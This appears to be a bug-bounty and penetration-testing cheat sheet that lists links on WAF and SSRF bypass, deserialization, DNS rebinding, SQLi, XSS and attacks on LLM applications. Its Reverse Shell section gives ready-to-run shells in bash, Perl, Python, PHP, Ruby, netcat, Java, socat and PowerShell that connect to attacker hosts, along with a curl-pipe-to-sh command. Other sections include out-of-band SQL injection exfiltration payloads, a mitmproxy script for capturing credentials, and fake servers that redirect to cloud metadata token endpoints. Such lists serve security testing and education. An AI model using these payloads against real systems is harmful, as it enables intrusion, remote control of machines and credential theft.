<br># We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.
<br>https://github.com/orangetw/Tiny-URL-Fuzzer/blob/master/samples.txt

### Bypass
https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html
<br># Bypassing CDN WAF’s with Alternate Domain Routing

https://bishopfox.com/blog/json-interoperability-vulnerabilities
<br># The same JSON document can be parsed with different values across microservices, leading to a variety of potential security risks.

https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
<br># Browsers support internetionalized domains, but some Unicode characters are converted into English letters and symbols. This may be useful to make very short domains or bypass SSRF protection.

https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
<br># It’s hard to overstate the severity of this bug. If you are using ECDSA signatures for any of these security mechanisms, then an attacker can trivially and completely bypass them if your server is running any Java 15, 16, 17, or 18 version before the April 2022 Critical Patch Update (CPU). For context, almost all WebAuthn/FIDO devices in the real world (including Yubikeys) use ECDSA signatures and many OIDC providers use ECDSA-signed JWTs.

https://h.43z.one/ipconverter/
<br># Convert IP address to different formats for bypass.

https://github.com/aufzayed/bugbounty/tree/main/403-bypass
<br># Common 403 bypass.

https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
<br># In this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers.

https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/
<br># The cookieless feature of .NET Framework could be abused to access protected directories or those blocked by URL filters in IIS.

https://github.com/assetnote/nowafpls
<br># nowafpls is a simple Burp plugin which will contextually insert this junk data into your HTTP request inside the repeater tab. You can select from a preset amount of junk data you want inserted, or you can insert an arbitrary amount of junk data by selecting the "Custom" option. This tool is just 80 or so lines of Python, it's incredibly simple but works for most WAFs lol.

https://blog.orange.tw/2024/08/confusion-attacks-en.html
<br># This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies.

https://github.com/renniepak/CSPBypass
<br># Welcome to CSPBypass.com, a tool designed to help ethical hackers bypass restrictive Content Security Policies (CSP) and exploit XSS (Cross-Site Scripting) vulnerabilities on sites where injections are blocked by CSPs that only allow certain whitelisted domains.

https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie
<br># HTTP cookies often control critical website features, but their long and convoluted history exposes them to parser discrepancy vulnerabilities. In this post, I'll explore some dangerous, lesser-known features of modern cookie parsers and show how they can be abused to bypass web application firewalls. This is the first part of a series of blog posts on cookie parsing.

https://hexagonal-humble-damselfly.glitch.me/
<br># Punycode converter. Just put the name you want to convert. Click a letter you want to change and you'll get multiple input versions.

https://embracethered.com/blog/ascii-smuggler.html
<br># Convert text to invisible Unicode encodings and decode hidden secrets.

https://www.punycoder.com/
<br># Punycoder is a tool for Unicode to ASCII/Punycode and vice-versa conversion.

https://github.com/assetnote/newtowner
<br># Abuse trust-boundaries to bypass firewalls and network controls.
<br>```newtowner --provider github --urls urls.txt```

https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/
<br># If you want to generate a new window on a webpage, there are probably only two options: one is to embed resources on the same page using tags such as iframe, embed, and object, and the other is to use window.open to open a new window.
<br># As a front-end developer, I believe that everyone is familiar with these. You may have used iframe to embed third-party web pages or widgets, or used window.open to open a new window and communicate with the original window through window.opener.
<br># However, from a security perspective, there are many interesting things about iframes, which often appear in the real world or in CTF competitions. Therefore, I want to record some of the features I learned recently through this article.

### Deserialization
https://github.com/joaomatosf/jexboss
<br># JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.

https://github.com/pimps/JNDI-Exploit-Kit
<br># This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). 

https://github.com/frohoff/ysoserial
<br># A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

https://github.com/pwntester/ysoserial.net
<br># A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.

https://github.com/irsdl/ysonet
<br># YSoNet (previously known as ysoserial.net) is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects.

https://github.com/ambionics/phpggc
<br># PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of frohoff's ysoserial, but for PHP. Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.

### SSRF (Server-Side Request Forgery)
https://lab.wallarm.com/blind-ssrf-exploitation/
<br># There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.

https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
<br># A Glossary of Blind SSRF Chains.

https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/
<br># BRING YOUR OWN SSRF – THE GATEWAY ACTUATOR.

https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/
<br># Attacking Java RMI via SSRF.

https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next
<br># Got SSRF in a AWS lambda?
```http://localhost:9001/2018-06-01/runtime/invocation/next```

https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
<br># This cheat sheet contains payloads for bypassing URL validation. These wordlists are useful for attacks such as server-side request forgery, CORS misconfigurations, and open redirection.

https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/
<br># Blind Server-Side Request Forgery bugs are tricky to exploit, and obtaining the full HTTP response is one of the primary goals with any SSRF vulnerability. With modern cloud architectures, leaking the full HTTP response can often lead to cloud environment compromise if we can obtain the security credentials from the metadata IP.
<br># However, what if you’re in a situation where the application just refuses to return the full HTTP response? Perhaps it’s performing some parsing logic, and your response does not fit its specifications, leading to an uneventful parsing error. These were the same challenges we faced recently when looking at widely used enterprise software.
<br># We saw some unexpected behavior in this software that led to the leakage of the full redirect chain, including the final 200 OK response. We wanted to take some time today to blog about the issue, as it could lead to other SSRF vulnerabilities being exploitable in a similar way. Since this technique was surprisingly successful in this popular enterprise product, this pattern may hold true elsewhere.

### OAuth
https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
<br># In this article, we will be focusing on the most common flow that you will come across today, which is the OAuth 2.0 authorization code grant type.

https://portswigger.net/web-security/oauth
<br># In this section, we'll teach you how to identify and exploit some of the key vulnerabilities found in OAuth 2.0 authentication mechanisms.

https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts
<br># Hackers could take over millions of accounts on Grammarly, Vidio and Bukalapak.

### DNS Rebinding
https://github.com/nccgroup/singularity
<br># Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.

https://github.com/brannondorsey/dns-rebind-toolkit
<br># DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).

https://github.com/brannondorsey/whonow
<br># A malicious DNS server for executing DNS Rebinding attacks on the fly.

https://nip.io
<br># Dead simple wildcard DNS for any IP Address

https://sslip.io
<br># sslip.io is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.

http://1u.ms/
<br># This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.

https://github.com/Rhynorater/rebindMultiA
<br># rebindMultiA is a tool to perform a Multiple A Record rebind attack.

### SMTP Header Injection
https://www.acunetix.com/blog/articles/email-header-injection/
<br># It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.
<br>```POST /contact.php HTTP/1.1```
<br>```Host: www.example2.com```
<br>``` ```
<br>```name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!```

### Web Shell
https://www.kali.org/tools/webshells/
<br># A collection of webshells for ASP, ASPX, CFM, JSP, Perl, and PHP servers.

### Reverse Shell
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
<br># If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
<br># Bash
<br>```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

<br># PERL
<br>```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

<br># Python
<br>```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

<br># PHP
<br>```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```

<br># Ruby
<br>```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

<br># Netcat
<br>```nc -e /bin/sh 10.0.0.1 1234```
<br>```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```

<br># Java
<br>```r = Runtime.getRuntime()```
<br>```p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])```
<br>```p.waitFor()```

<br># xterm
<br>```xterm -display 10.0.0.1:1```
<br>```Xnest :1```
<br>```xhost +targetip```

<br># powershell (without download)
<br>```echo IEX(New-Object Net.WebClient).DownloadString("http://attacker.com:8442/powercat.ps1") | powershell -noprofile; powercat -c attacker.com -p 8443 -e cmd```

https://reverse-shell.sh/
<br># Reverse Shell as a Service
<br>```nc -l 1337```
<br>```curl https://reverse-shell.sh/yourip:1337 | sh```

https://github.com/calebstewart/pwncat
<br># pwncat is a post-exploitation platform for Linux targets.

<br># Interactive sh shell
<br>```/bin/sh -i```

<br># Interactive bash shell
<br>```/bin/bash -i```

<br># Interactive shell perl
<br>```perl -e 'exec "/bin/sh";'```
<br># or
<br>```perl -e 'use POSIX; POSIX::setsid(); exec("/bin/bash -i");'```

<br># Interactive shell ruby
<br>```ruby -e 'exec "/bin/bash"'```

https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1
<br># How to Get a Fully Interactive Reverse Shell
<br># Step 1
<br>```python -c "import pty; pty.spawn('/bin/bash')"```
<br># or
<br>```python3 -c "import pty; pty.spawn('/bin/bash')"```
<br># or
<br>```script /dev/null -c bash```
<br># Step 2
<br>```CTRL + z```
<br># Step 3
<br>```stty raw -echo```
<br>```fg```
<br># or
<br>```stty raw -echo;fg```
<br># Step 4
<br>```export TERM=xterm```

<br># Reverse shell /dev/pts method
<br># On attacker
<br>```socat file:`tty`,raw,echo=0 tcp-listen:4444```
<br># On target
<br>```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444```

### SQLi (SQL Injection)<a name="sqli-sql-injection_manual"></a>
https://arxiv.org/abs/1303.3047
<br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.

https://livesql.oracle.com
<br># Learn and share SQL. Running on Oracle Database 19c.

https://www.db-fiddle.com
<br># An online SQL database playground for testing, debugging and sharing SQL snippets.

http://sqlfiddle.com/
<br># Application for testing and sharing SQL queries.

<br># Oracle
<br>```'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'```
<br>```'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'```
<br>```'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'```
<br>```'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'```

<br># MySQL
<br>```'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'```

<br># Microsoft SQL Server
<br>```'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'```
<br>```'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'```
<br>```'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'```

<br># PostgreSQL
<br>```'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'```

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
<br># This repository contains a advanced methodology of all types of SQL Injection.

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
<br># This SQL injection cheat sheet is an updated version of a 2007 post by Ferruh Mavituna on his personal blog. Currently this SQL injection cheat sheet only contains information for MySQL, Microsoft SQL Server, and some limited information for ORACLE and PostgreSQL SQL servers. Some of the samples in this sheet might not work in every situation because real live environments may vary depending on the usage of parentheses, different code bases and unexpected, strange and complex SQL sentences.

https://www.websec.ca/kb/sql_injection
<br># The SQL Injection Knowledge Base

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
<br># Use our SQL Injection Cheat Sheet to learn about the different variants of the SQL injection vulnerability.

### XSS<a name="xss_manual"></a>
https://rhynorater.github.io/postMessage-Braindump
<br># postMessage-related bugs have landed me some serious bounties during the past couple live hacking events. Here is a quick summary of what you need to know about postMessage.

https://www.gremwell.com/firefox-xss-302
<br># Forcing Firefox to Execute XSS Payloads during 302 Redirects.

https://trufflesecurity.com/blog/xsshunter/
<br># Truffle Security is proud to host a new XSSHunter.

https://tinyxss.terjanq.me/
<br># A collection of short XSS payloads that can be used in different contexts.

### XPath Injection
https://book.hacktricks.xyz/pentesting-web/xpath-injection
<br># XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

https://devhints.io/xpath
<br># Xpath cheatsheet.

https://www.s4msecurity.com/2022/06/08/xml-xpath-injection-search-bwapp-level-low/
<br># This article subject XML/XPath Injection vulnerability on web app.

### Path Traversal
https://github.com/avlidienbrunn/archivealchemist
<br># Archive Alchemist is a tool for creating specially crafted archives to test extraction vulnerabilities.

### LFI (Local File Inclusion)
https://bierbaumer.net/security/php-lfi-with-nginx-assistance/
<br># This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming only that PHP is running in combination with Nginx under a common standard configuration.

### SSTI (Server Side Template Injection)
https://www.youtube.com/watch?v=SN6EVIG4c-0
<br># Template Injections (SSTI) in 10 minutes

https://portswigger.net/research/server-side-template-injection
<br># Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

https://github.com/epinna/tplmap
<br># Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.
<br>```tplmap.py --os-shell -u 'http://www.example.com/page?name=John'```

https://github.com/vladko312/SSTImap
<br># SSTImap is a penetration testing software that can check websites for Code Injection and Server-Side Template Injection vulnerabilities and exploit them, giving access to the operating system itself.
<br>```sstimap.py -u https://example.com/page?name=John```

### Information Disclosure

https://infosecwriteups.com/information-disclosure-vulnerability-in-adobe-experience-manager-affecting-multiple-companies-2fb0558cd957
<br>```https://www.example.com/content/example/filename.pdf/.1.json```

### WebDAV (Web Distributed Authoring and Versioning)
http://www.webdav.org/cadaver/
<br># cadaver is a command-line WebDAV client for Unix.

https://github.com/cldrn/davtest
<br># This program attempts to exploit WebDAV enabled servers.

### Generic Tools
https://ahrefs.com/backlink-checker
<br># Try the free version of Ahrefs' Backlink Checker.

https://gchq.github.io/CyberChef/
<br># The Cyber Swiss Army Knife

https://github.com/securisec/chepy
<br># Chepy is a python lib/cli equivalent of the awesome CyberChef tool.

https://packettotal.com/
<br># Pcap analysis and samples

https://github.com/vavkamil/awesome-bugbounty-tools
<br># A curated list of various bug bounty tools.

https://check-host.net/
<br># Check-Host is a modern online tool for website monitoring and checking availability of hosts, DNS records, IP addresses.

https://github.com/fyoorer/ShadowClone
<br># ShadowClone allows you to distribute your long running tasks dynamically across thousands of serverless functions and gives you the results within seconds where it would have taken hours to complete.

https://github.com/A-poc/RedTeam-Tools
<br># This github repository contains a collection of 125+ tools and resources that can be useful for red teaming activities.

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md
<br># All Atomic Tests by ATT&CK Tactic & Technique (https://atomicredteam.io/atomics/).

https://github.com/fransr/unpack-burp
<br># This is a small tool created by Frans Rosén. For unpacking base64:ed "Save items"-content from Burp.

https://github.com/codingo/Interlace
<br># Easily turn single threaded command line applications into a fast, multi-threaded application with CIDR and glob support.

## AI
https://portswigger.net/web-security/llm-attacks
<br># Organizations are rushing to integrate Large Language Models (LLMs) in order to improve their online customer experience. This exposes them to web LLM attacks that take advantage of the model's access to data, APIs, or user information that an attacker cannot access directly.

https://owasp.org/www-project-top-10-for-large-language-model-applications/
<br># The OWASP Top 10 for Large Language Model Applications project aims to educate developers, designers, architects, managers, and organizations about the potential security risks when deploying and managing Large Language Models (LLMs).

https://owaspai.org/
<br># Welcome to the go-to resource for broad AI security & privacy - over 200 pages of practical advice and references on protecting AI and data-centric systems from threats. This content serves as key bookmark for practitioners, and is contributing actively and substantially to international standards such as ISO/IEC and the AI Act through official standard partnerships. Through broad collaboration with key institutes and SDOs, the Exchange represents the consensus on AI security and privacy.

https://github.com/OWASP/www-project-ai-testing-guide
<br># OWASP AI Testing Guide project is an open-source initiative aimed at providing comprehensive, structured methodologies and best practices for testing artificial intelligence systems.

https://genai.owasp.org/resource/genai-red-teaming-guide/
<br># This guide outlines the critical components of GenAI Red Teaming, with actionable insights for cybersecurity professionals, AI/ML engineers, Red Team practitioners, risk managers, adversarial attack researchers, CISOs, architecture teams, and business leaders. The guide emphasizes a holistic approach to Red Teaming in four areas: model evaluation, implementation testing, infrastructure assessment, and runtime behavior analysis.

https://github.com/protectai/ai-exploits
<br># The AI world has a security problem and it's not just in the inputs given to LLMs such as ChatGPT. Based on research done by Protect AI and independent security experts on the Huntr Bug Bounty Platform, there are far more impactful and practical attacks against the tools, libraries and frameworks used to build, train, and deploy machine learning models.

https://labs.zenity.io/
<br># Latest research, tools and talks about building and breaking copilots and no-code apps.

https://embracethered.com/blog/posts/2023/37c3-new-important-instructions/
<br># With the rapid growth of AI and Large Language Models users are facing an increased risk of scams, data exfiltration, loss of PII, and even remote code execution. This talk will demonstrate many real-world exploits the presenter discovered, including discussion of mitigations and fixes vendors put in place for the most prominent LLM applications, including ChatGPT, Bing Chat and Google Bard.

https://www.breachproof.net/blog/lethal-injection-how-we-hacked-microsoft-ai-chat-bot
<br># We have discovered multiple security vulnerabilities in the Azure Health Bot service, a patient-facing chatbot that handles medical information. The vulnerabilities, if exploited, could allow access to sensitive infrastructure and confidential medical data.

https://prompting.ai.immersivelabs.com/
<br># This is a safe environment where you can learn about the dangers of prompt injection attacks. You’ll be guided through a series of levels, with each one teaching you something new about these attacks.

https://gandalf.lakera.ai/
<br># Gandalf is an exciting game designed to challenge your ability to interact with large language models (LLMs).

https://www.linkedin.com/pulse/safeguard-your-ai-llm-penetration-testing-checklist-based-smith-nneac/
<br># This article contains a high-level (LLM)/AI penetration testing guide, with the primary purpose of providing direction when penetration testing (or defending) LLMs.

https://learnprompting.org/docs/prompt_hacking/injection
<br># Prompt Injection is the process of overriding original instructions in the prompt with special user input. It often occurs when untrusted input is used as part of the prompt.

https://www.usenix.org/system/files/sec21-carlini-extracting.pdf
<br># It has become common to publish large (billion parameter) language models that have been trained on private datasets. This paper demonstrates that in such settings, an adversary can perform a training data extraction attack to recover individual training examples by querying the language model.

https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2
<br># New prompt injection attack on ChatGPT web version. Markdown images can steal your chat data.

https://josephthacker.com/hacking/2025/02/25/how-to-hack-ai-apps.html
<br># The following is my attempt to make the best and most comprehensive guide to hacking AI applications. It’s quite large, but if you take the time to go through it all, you will be extremely well prepared.

https://medium.com/@attias.dor/the-burn-notice-part-1-5-revealing-shadow-copilots-812def588a7a
<br># In the first episode of our series, we’ll reveal how shockingly easy it was to extract financial data from multiple multi-billion-dollar companies. We’ll dive into Copilot Studio, Microsoft’s low-code/no-code platform for building AI agents, and uncover a technique that could allow threat actors to identify exposed agents.

https://www.bugcrowd.com/blog/a-low-cost-hacking-sidekick-baby-steps-to-using-offensive-ai-agents/
<br># This time around, we’ll be addressing the other side of the coin and covering some examples of harnessing agents for hacking purposes (ethically, of course). In this first part of an all-new series, I will start easy. I’ll build from the ground up for those who may not have any experience coding or using LLMs. At the same time, I’ll provide some food for thought for savvy vets. Writing code to build agents and evaluating them on the daily get my adrenaline pumping.

https://aliasrobotics.github.io/cai/
<br># A lightweight, ergonomic framework for building bug bounty-ready Cybersecurity AIs (CAIs).

https://azure.github.io/PyRIT/
<br># Welcome to the Python Risk Identification Tool for generative AI (PyRIT)! PyRIT is designed to be a flexible and extensible tool that can be used to assess the security and safety issues of generative AI systems in a variety of ways.

https://github.com/NVIDIA/garak
<br># Generative AI Red-teaming & Assessment Kit garak checks if an LLM can be made to fail in a way we don't want. garak probes for hallucination, data leakage, prompt injection, misinformation, toxicity generation, jailbreaks, and many other weaknesses.

https://github.com/prompt-security/ps-fuzz
<br># This interactive tool assesses the security of your GenAI application's system prompt against various dynamic LLM-based attacks. It provides a security evaluation based on the outcome of these attack simulations, enabling you to strengthen your system prompt as needed.

https://github.com/promptfoo/promptfoo
<br># Test your prompts, agents, and RAGs. AI Red teaming, pentesting, and vulnerability scanning for LLMs. Compare performance of GPT, Claude, Gemini, Llama, and more. Simple declarative configs with command line and CI/CD integration.

https://github.com/ethiack/ai4eh
<br># This repository contains the workshop guide, educational tools and scripts for learning how AI can be applied in offensive security.

https://github.com/westonbrown/Cyber-AutoAgent
<br># Cyber-AutoAgent is a proactive security assessment tool that autonomously conducts intelligent penetration testing with natural language reasoning, dynamic tool selection, and evidence collection using AWS Bedrock, Litellm or local Ollama models with the core Strands framework.

## General<a name="general_all"></a>
<br># Print only response headers for any method with curl
<br>```curl -skSL -D - https://www.example.com -o /dev/null```

<br># Files transfer with nc (Sender > Receiver)
<br># Receiver:
<br>```nc -l -p 12345 | pv | tar xz && echo "Files Received Successfully!"```
<br># Sender:
<br>```tar cz *files.txt | pv | nc -N example.com 12345 && echo "Files Sent Successfully!"```
<br>```tar cz *files.txt | pv | nc -q 3 example.com 12345 && echo "Files Sent Successfully!"```

<br># Files transfer with nc (Receiver > Sender)
<br># Sender:
<br>```tar cz *files.txt | pv | nc -N -l -p 12345 && echo "Files Sent Successfully!"```
<br>```tar cz *files.txt | pv | nc -q 3 -l -p 12345 && echo "Files Sent Successfully!"```
<br># Receiver:
<br>```nc example.com 12345 | pv | tar xz && echo "Files Received Successfully!"```

<br># Files transfer with socat (Sender > Receiver)
<br># Receiver:
<br>```socat -u TCP-LISTEN:12345,reuseaddr - | pv | tar xz && echo "Files Received Successfully!"```
<br># Sender:
<br>```tar cz *files.txt | pv | socat -u - TCP:example.com:12345 && echo "Files Sent Successfully!"```

<br># Files transfer with socat (Receiver > Sender)
<br># Sender:
<br>```tar cz *files.txt | pv | socat -u - TCP-LISTEN:12345,reuseaddr && echo "Files Sent Successfully!"```
<br># Receiver:
<br>```socat -u TCP:example.com:12345 - | pv | tar xz && echo "Files Received Successfully!"```

<br># Extract website certificate
<br>```true | openssl s_client -connect www.example.com:443 2>/dev/null | openssl x509 -noout -text```

<br># Pure bash multhread script
```
#!/bin/bash

FILE="${1}"
THREADS="${2}"
TIMEOUT="${3}"
CMD="${4}"
NUM=$(wc -l ${FILE} | awk '{ print $1 }')
THREAD=0
NUMDOM=0
while read SUBDOMAIN; do
        PIDSTAT=0
        if [ $THREAD -lt $THREADS ]; then
                eval timeout ${TIMEOUT} ${CMD} 2>/dev/null &
                PIDS[$THREAD]="${!}"
                let THREAD++
                let NUMDOM++
                echo -ne "\r>Progress: ${NUMDOM} of ${NUM} ($(awk "BEGIN {printf \"%0.2f\",(${NUMDOM}*100)/${NUM}}")%)\r"
        else
                while [ ${PIDSTAT} -eq 0 ]; do
                        for j in "${!PIDS[@]}"; do
                                kill -0 "${PIDS[j]}" > /dev/null 2>&1
                                PIDSTAT="${?}"
                                if [ ${PIDSTAT} -ne 0 ]; then
                                        eval timeout ${TIMEOUT} ${CMD} 2>/dev/null &
                                        PIDS[j]="${!}"
                                        let NUMDOM++
                                        echo -ne "\r>Progress: ${NUMDOM} of ${NUM} ($(awk "BEGIN {printf \"%0.2f\",(${NUMDOM}*100)/${NUM}}")%)\r"
                                        break
                                fi
                        done
                done
        fi
done < ${FILE}
wait
```

<br># Reverse Proxy (mitmproxy)
<br>```mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/``` # Good for capture credentials
```
$ cat script.py
import mitmproxy.http
from mitmproxy import ctx

def request(flow):
    if flow.request.method == "POST":
        ctx.log.info(flow.request.get_text())
        f = open("captured.log", "a")
        f.write(flow.request.get_text() + '\n')
        f.close()
```

<br># Port Forwarding (socat)
<br>```sudo socat -v TCP-LISTEN:80,fork TCP:127.0.0.1:81```

<br># Reverse Proxy (socat)
<br>```socat -v -d -d TCP-LISTEN:8101,reuseaddr,fork TCP:127.0.0.1:8100```
<br>```sudo socat -v -d -d openssl-listen:8443,cert=cert.pem,reuseaddr,fork,verify=0 SSL:127.0.0.1:443,verify=0```

<br># SOCKS Proxy
<br>```ssh -N -D 0.0.0.0:1337 localhost```

https://github.com/projectdiscovery/proxify/
<br># Swiss Army Knife Proxy for rapid deployments. Supports multiple operations such as request/response dump, filtering and manipulation via DSL language, upstream HTTP/Socks5 proxy.
<br>```proxify -socks5-proxy socks5://127.0.0.1:9050```

<br># Fake HTTP Server
<br>```while true ; do echo -e "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2\r\n\r\nOK" | sudo nc -vlp 80; done```
<br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Connection: close";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
<br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
<br>```FILE=image.jpg;socat -v -d -d TCP-LISTEN:80,fork "SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c<$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo;dd 2>/dev/null<$FILE"``` # Present an image
<br>```python2 -m SimpleHTTPServer 8080```
<br>```python3 -m http.server 8080```
<br>```php -S 0.0.0.0:80```
<br>```ruby -run -e httpd . -p 80```
<br>```busybox httpd -f -p 80```
    
<br># Fake HTTPS Server
<br>```openssl req -new -x509 -keyout test.key -out test.crt -nodes```
<br>```cat test.key test.crt > test.pem```
<br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Connection: close";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
<br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Connection: close";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
<br>```stunnel stunnel.conf``` # Check https://www.stunnel.org/

<br># Python 3 Simple HTTPS Server
```
    import http.server, ssl
    server_address = ('0.0.0.0', 443)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/path/cert.pem', ssl_version=ssl.PROTOCOL_TLS)
    httpd.serve_forever()
```

<br># Fake FTP Server
<br>```sudo python -m pyftpdlib --directory=/tmp/dir/ --port=21```

<br># Fake SMTP Server
<br>```sudo python -m aiosmtpd -n -l 0.0.0.0:25```

<br># Check HTTP or HTTPS
<br>```while read i; do curl -m 15 -ki http://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt```
<br>```while read i; do curl -m 15 -ki https://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt```

<br># Ten requests in parallel
<br>```xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com < <(printf '%s\n' {1..10000})```

<br># Burp Intruder
<br>```xargs -I $ -P 10 curl -skL -o /dev/null "https://example.com/$" -w "%{http_code} /$\n" < <(head fuzz.txt)```
